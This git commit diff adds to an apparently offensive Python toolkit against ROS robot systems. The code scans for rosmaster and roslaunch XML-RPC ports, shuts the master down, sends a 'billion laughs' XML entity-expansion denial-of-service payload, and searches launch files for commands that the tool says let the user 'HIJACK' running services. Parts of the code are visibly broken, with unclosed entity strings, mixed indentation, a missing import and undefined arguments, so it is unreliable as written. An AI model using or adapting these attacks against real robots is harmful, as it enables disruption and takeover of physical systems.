144ae8c818a825d991b3a3563608c000cda40cd1
flack3r <kyj9206@gmail.com>
2016-12-08 21:40:23 +0900

    hanos's tool merge

--- Attack.py
+++ Attack.py
@@ -1,7 +1,20 @@
+import requests
+import re
+import httplib, socket
+
+RED     = lambda x: "\033[31m "+x+" \033[0m"
+BLUE    = lambda x: "\033[34m "+x+" \033[0m"
+YELLOW  = lambda x: "\033[33m "+x+" \033[0m"
+BGREEN  = lambda x: "\033[36m "+x+" \033[0m"
+
+ADDED   = BLUE("[+]")
+ERROR   = RED("[-]")
+NOTIFY  = BGREEN("[*]")
+
 try:
-    from xmlrpc.client import ServerProxy
+    from xmlrpc.client import ServerProxy, Transport
 except ImportError:
-	from xmlrpclib import ServerProxy
+	from xmlrpclib import ServerProxy, Transport
 
 class Attack:
 	def __init__(self):
@@ -10,35 +23,35 @@ class Attack:
 	def PortScanning(self, ip='127.0.0.1'):
 		#stage1 roscore open check
 		print "[*]port scanning"
-		port = 11311
+		self.master_port = 11311
 		first_find = True
 		while True:
 			try:
-				self.proxy = ServerProxy("http://"+ip+":"+str(port)+"/")
+				self.proxy = ServerProxy("http://"+ip+":"+str(self.master_port)+"/")
 				rosmaster_pid = self.proxy.getPid("")[2]
 				break
 			except:
-				if (port == 11312) and (first_find):
-					port = 1
+				if (self.master_port == 11312) and (first_find):
+					self.master_port = 1
 					first_find = False
 				else:
-					port += 1
+					self.master_port += 1
 				continue
 
-		print "[*]rosmaster XmlRpcServer pid: %d, port: %d" %(rosmaster_pid, port)
+		print "[*]rosmaster XmlRpcServer pid: %d, port: %d" %(rosmaster_pid, self.master_port)
 		
 		#stage2 roslaunch xmlrpc server port checking
-		port = 10000
+		self.launch_port = 10000
 		while True:
 			try:
-				self.launch_proxy = ServerProxy("http://"+ip+":"+str(port)+"/")
+				self.launch_proxy = ServerProxy("http://"+ip+":"+str(self.launch_port)+"/")
 				roslaunch_pid = self.launch_proxy.get_pid()[2]
 				break
 			except:
-				port += 1
+				self.launch_port += 1
 				continue
 
-		print "[*]roslaunch XmlRpcServer pid: %d, port: %d" %(roslaunch_pid, port)
+		print "[*]roslaunch XmlRpcServer pid: %d, port: %d" %(roslaunch_pid, self.launch_port)
 
 	def FingerPrinting(self):
 		print "[*]finger printing"
@@ -98,3 +111,168 @@ class Attack:
 		#stage2 turn off master
 		print "[*]turn off ros"
 		self.proxy.shutdown("","")
+
+	def XxeDosAttack(self, ip="127.0.0.1"):
+		xml = """<?xml version="1.0"?>
+		<!DOCTYPE xxx [
+		 <!ENTITY lol "lol">
+		 <!ELEMENT lolz (#PCDATA)>
+		 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+		 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;
+		 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;
+		 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;
+		 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;
+		 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;
+		 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;
+		 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;
+		 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;
+		]> 
+		<methodCall>
+		<methodName>&lol9;</methodName>
+		</methodCall>
+		"""
+		
+		headers = {'Host':ip+':'+self.master_port,
+		'Accept-Encoding':'gzip',
+		'User-Agent': 'XMLRPC++ 0.7',
+		'Content-Type': 'text/xml',
+		'Content-Length': str(len(xml))} # set what your server accepts
+
+		res = requests.post('http://'+ip+':'+self.master_port, data=xml, headers=headers)
+		print res.content
+
+	def findPack(self):
+		def getRosState():
+		    FIRST_BLOCK     = 0
+		    NODE_BLOCK      = 1
+		    RESULT_BLOCK    = 2
+			
+		    rosInfo={}
+
+			proxy = self.proxy
+
+			for service in proxy.getSystemState("/rosservice")[RESULT_BLOCK][RESULT_BLOCK]:
+				if service[NODE_BLOCK][FIRST_BLOCK] not in rosInfo:
+					rosInfo[service[NODE_BLOCK][FIRST_BLOCK]] = []
+				rosInfo[service[NODE_BLOCK][FIRST_BLOCK]].append(service[FIRST_BLOCK])
+
+			print NOTIFY + "[ ROS State ]---------------------------------------------"    
+			print NOTIFY + ""
+			print NOTIFY + "Type\tName"
+			print NOTIFY + "--------\t-----------------------------------------------",
+			print ""
+
+			for node in rosInfo:
+				print NOTIFY + "Node\t",node
+				for service in rosInfo[node]:
+					print NOTIFY + 'Service\t| -',service
+				print NOTIFY
+		    
+			print NOTIFY + "----------------------------------------------------------"
+
+			return rosInfo
+
+		def getPackagePath():
+		    paths = []
+
+		    print ""
+		    print ADDED + "Getting own ROS package path for searching command"
+		    ROS_PACKAGE_PATH = os.getenv('ROS_PACKAGE_PATH')
+
+		    print ""
+		    print NOTIFY + "[ ROS Package Path ]--------------------------------------"
+		    
+		    for path in ROS_PACKAGE_PATH.split(':'):
+		        paths.append(path)
+		        print ADDED + "Path\t",path
+		    
+		    print NOTIFY + "----------------------------------------------------------"
+
+		    return paths
+
+		def nodeMatch(nodes, fpath):
+		    nodeTag = "<node "
+		    matchCnt = 0
+
+		    fd = open(fpath, 'r')
+		    data = fd.read()
+		    fd.close()
+
+		    p = re.compile(r'<node.+name="(.*?)"', re.MULTILINE)
+		    tmps = p.findall(data)
+
+		    for i in range (len(tmps)):
+		        tmps[i] = '/' + tmps[i]
+		        if tmps[i] in nodes:
+		            matchCnt = matchCnt+1
+		            
+		    if matchCnt is len(tmps) and matchCnt is not 0:
+		        p = re.compile(r'.*share/(.*?)/')
+		        package = p.findall(fpath)[0]
+		 
+		        print ""
+		        print NOTIFY + "Package\t", package
+				#        for tmp in tmps:
+				#            print NOTIFY + "[Node]\t| -", tmp
+		        
+		        return (package, tmps)
+		    
+		    return
+
+
+		def findLaunchPackage(paths, nodes):
+		    try:
+		        tmp = nodes[:]
+		        tmp.remove('/rosout')
+		        matchFlag = False           # if found set this value
+
+		        print ""
+		        print ADDED + "Searching command for service hijacking..."
+		        print ADDED + "Command format: roslaunch [ROS_Package] [ROS_Node]"
+		        print ""
+
+		        print NOTIFY + "[ ROS Launch Info ]---------------------------------------"
+		        
+		        print NOTIFY + ""
+		        print NOTIFY + "Type\tName"
+		        print NOTIFY + "--------\t-----------------------------------------------",
+		        
+		        for wPath in paths:
+		            for (path, dirt, files) in os.walk(wPath):
+		                for fname in files:
+		                    ext = os.path.splitext(fname)[-1]
+		                    if ext == '.launch':
+		                        matchs = nodeMatch(tmp, path+"/"+fname)
+
+		                        if matchs:
+		                            package = matchs[0]
+		                            mNodes  = matchs[1]
+		                            matchFlag = True
+
+		                            print NOTIFY + "Launch\t| -", fname
+		                            for node in mNodes:
+		                                print NOTIFY + "Node\t\t| -", node
+		                            print YELLOW("[*] Command -> roslaunch " + package + " " + fname)
+		                            print NOTIFY,
+
+		        if matchFlag is False:
+		            print ""
+		            print ERROR + "Not Found",
+
+		        print ""
+		        print NOTIFY + "----------------------------------------------------------"
+		        
+		        if matchFlag is True:
+		            print ""
+		            print ADDED + "By executing the command,"
+		            print ADDED + "You can HIJACK the services contained in the ROS Node"
+		            print ADDED + "Try it?"
+		            print ""
+		    except:
+		        pass
+
+
+		rosInfo = getRosState(ROS_MASTER_URI)
+		nodes   = rosInfo.keys()
+		paths   = getPackagePath()
+		findLaunchPackage(paths, nodes)
--- RosVulnCheck.py
+++ RosVulnCheck.py
@@ -1,9 +1,65 @@
 import Attack
 import Sheild
 
+RED     = lambda x: "\033[31m "+x+" \033[0m"
+BLUE    = lambda x: "\033[34m "+x+" \033[0m"
+YELLOW  = lambda x: "\033[33m "+x+" \033[0m"
+BGREEN  = lambda x: "\033[36m "+x+" \033[0m"
+
+ADDED   = BLUE("[+]")
+ERROR   = RED("[-]")
+NOTIFY  = BGREEN("[*]")
+
+def intro():
+    print BLUE('''
+        ____                               __            _    __ 
+       / __ \   ____     _____   ____     / /  ____     (_)  / /_
+      / /_/ /  / __ \   / ___/  / __ \   / /  / __ \   / /  / __/
+     / _, _/  / /_/ /  (__  )  / /_/ /  / /  / /_/ /  / /  / /_  
+    /_/ |_|   \____/  /____/  / .___/  /_/   \____/  /_/   \__/  
+                             /_/                    
+    '''),
+    print RED('\t\t\t\t\t\t\td[ o_O ]b')
+
+    print YELLOW('''
+        ;        /              ,--. 		    !
+       ["]      ["]  ,<        |__**|		  \["]/
+      /[_]\     [~]\/        ~ |//  |		   [_]
+       ] [      OOO        ~ ~ /o|__|		   / |
+	''')
+
+
+def is_ipv4(ip):
+	match = re.match("^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
+	if not match:
+		return False
+	quad = []
+	for number in match.groups():
+		quad.append(int(number))
+	if quad[0] < 1:
+		return False
+	for number in quad:
+		if number > 255 or number < 0:
+			return False
+	return True
+
 def main():
+	intro()
+
+	print ""
+	print ADDED + "Enter target ros ip address"
+	
+	while True:
+	    inputIP = raw_input('ros > ')
+
+	    if(is_ipv4(inputIP)):
+	        break
+	    else:
+	        print ERROR + "Invalid ip address.."
+	        print ERROR + "Try again..."
+
+
 	attack = Attack.Attack()
-	sheild = Sheild.Sheild()
 	
 	attack.PortScanning()
 	attack.FingerPrinting()
